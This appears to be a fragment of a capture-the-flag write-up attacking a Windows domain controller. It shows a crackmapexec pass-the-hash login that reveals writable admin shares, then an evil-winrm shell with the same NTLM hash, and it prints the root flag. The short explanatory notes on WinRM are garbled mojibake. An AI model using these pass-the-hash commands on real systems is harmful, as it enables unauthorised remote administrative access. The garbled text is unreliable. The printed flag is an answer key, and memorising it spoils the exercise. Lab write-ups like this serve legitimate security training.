â””â”€# crackmapexec smb 10.0.91.3 -u FileServer$ -H e41da7e79a4c76dbd9cf79d1cb325559 --shares        
SMB         10.0.91.3       445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.0.91.3       445    DC01             [+] SOUPEDECODE.LOCAL\FileServer$:e41da7e79a4c76dbd9cf79d1cb325559 (Pwn3d!)
SMB         10.0.91.3       445    DC01             [+] Enumerated shares
SMB         10.0.91.3       445    DC01             Share           Permissions     Remark
SMB         10.0.91.3       445    DC01             -----           -----------     ------
SMB         10.0.91.3       445    DC01             ADMIN$          READ,WRITE      Remote Admin
SMB         10.0.91.3       445    DC01             backup                          
SMB         10.0.91.3       445    DC01             C$              READ,WRITE      Default share
SMB         10.0.91.3       445    DC01             IPC$            READ            Remote IPC
SMB         10.0.91.3       445    DC01             NETLOGON        READ,WRITE      Logon server share 
SMB         10.0.91.3       445    DC01             SYSVOL          READ            Logon server share 
SMB         10.0.91.3       445    DC01             Users       
```

# Getshell
è¿œç¨‹ç«¯å£ WinRM  5985å¼€æ”¾

+ WinRM æ˜¯ Windows çš„ **è¿œç¨‹ç®¡ç†æœåŠ¡**ï¼Œæœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ª **åŸºäº HTTP/HTTPS çš„è¿œç¨‹ PowerShell é€šé“**
+ é»˜è®¤ç›‘å¬ç«¯å£ï¼š
+ HTTPï¼š5985
+ HTTPSï¼š5986
+ å…è®¸è¿œç¨‹æ‰§è¡Œ PowerShell å‘½ä»¤
+ æ”¯æŒå¤šç§èº«ä»½éªŒè¯æ–¹å¼ï¼š
+ **Kerberos**
+ **NTLM**
+ æ˜æ–‡å¯†ç 

```c
evil-winrm -i 10.0.91.3 -u 'FileServer$' -H 'e41da7e79a4c76dbd9cf79d1cb325559'

*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
a9564ebc3289b7a14551baf8ad5ec60a
```

